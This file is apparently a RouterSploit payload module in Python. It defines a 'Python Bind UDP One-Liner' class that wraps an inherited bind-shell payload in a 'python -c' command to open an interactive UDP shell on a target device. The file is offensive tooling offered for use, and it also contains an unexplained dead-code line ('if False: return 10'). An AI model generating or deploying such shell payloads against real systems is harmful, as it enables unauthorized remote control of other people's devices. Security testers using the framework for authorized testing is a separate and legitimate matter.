from routersploit.core.exploit import *
from routersploit.modules.payloads.python.bind_udp import Payload as PythonBindUDP

class Payload(PythonBindUDP):
    __info__ = {'name': 'Python Bind UDP One-Liner', 'description': 'Creates interactive udp bind shell by using python one-liner.', 'authors': ('Marcin Bury <marcin[at]threat9.com>',)}
    cmd = OptString('python', 'Python binary')

    def generate(self):
        if False:
            return 10
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload